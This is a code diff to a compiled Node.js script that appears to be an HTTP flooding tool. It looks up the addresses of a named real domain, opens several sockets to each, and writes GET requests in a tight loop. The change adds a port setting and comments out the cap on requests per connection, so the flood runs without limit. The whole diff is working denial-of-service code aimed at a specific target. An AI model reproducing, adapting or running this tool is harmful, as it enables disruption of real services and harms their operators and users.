@@ -9,14 +9,18 @@ const http_1 = __importDefault(require("http"));
 const net_1 = __importDefault(require("net"));
 const perf_hooks_1 = require("perf_hooks");
 class Target {
-    constructor(ip) {
+    constructor(ip, port) {
         this.socket = null;
         this.madeRequests = 0;
         this.ip = ip;
+        this.port = port;
     }
 }
 let queue = new Set();
 console.log('hello');
+// for (let i = 0; i < 10; i++) {
+//     queue.add(new Target("127.0.0.1", 8557));
+// }
 (0, node_dig_dns_1.default)(['rshb-in.tech', '+short'])
     .then((result) => {
     let adresses = result.split('\n');
@@ -25,7 +29,7 @@ console.log('hello');
     }
     for (let addr of adresses) {
         for (let i = 0; i < 10; i++) {
-            queue.add(new Target(addr));
+            queue.add(new Target(addr, 80));
         }
     }
     // console.log(adresses.join(', '));
@@ -73,7 +77,7 @@ function run1(ip) {
 // + "Accept-Encoding: gzip, deflate\r\n"
 // + "Connection: Keep-Alive\r\n\r\n"
 let text = "GET /get HTTP/1.1\r\n"
-    + "Host: rshb-in.tech\r\n"
+    // + "Host: rshb-in.tech\r\n"
     // + "User-Agent: mike\r\n"
     + "X-Email-Id: busyrev@gmail.com\r\n"
     // + "Accept-Encoding: gzip, deflate\r\n"
@@ -101,7 +105,7 @@ function run(target) {
     var socket = new net_1.default.Socket();
     target.socket = socket;
     queue.delete(target);
-    socket.connect(80, target.ip, function () {
+    socket.connect(target.port, target.ip, function () {
         // console.log('Connected');
         fuckClient(target);
     });
@@ -129,7 +133,6 @@ function run(target) {
     });
 }
 function fuckClient(target) {
-    var _a;
     let writeResult = false;
     do {
         inProgress++;
@@ -137,13 +140,13 @@ function fuckClient(target) {
         totalRequestsMade++;
         writeResult = target.socket.write(text);
         target.madeRequests++;
-        if (target.madeRequests >= 10000) {
-            (_a = target.socket) === null || _a === void 0 ? void 0 : _a.destroy();
-            target.madeRequests = 0;
-            target.socket = null;
-            queue.add(target);
-            return;
-        }
+        // if (target.madeRequests >= 30000) {
+        //     target.socket?.destroy();
+        //     target.madeRequests = 0;
+        //     target.socket = null;
+        //     queue.add(target);
+        //     return;
+        // }
     } while (writeResult == true);
     // console.log('writeResult: ' + writeResult);
 }
